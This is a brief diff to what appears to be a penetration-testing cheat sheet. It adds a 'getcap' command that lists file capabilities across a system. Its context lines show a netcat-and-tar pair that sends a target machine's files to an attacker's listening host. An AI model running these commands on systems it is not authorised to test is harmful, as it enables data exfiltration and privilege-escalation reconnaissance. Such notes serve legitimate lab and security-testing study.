@@ -91,3 +91,8 @@ nc -lvnp 1337 | tar -xf -
 ## target
 tar -cf - . | nc $LHOST 1337
 ```
+
+# get capabilities of all files recursively
+```bash
+getcap -r / 2>/dev/null
+```
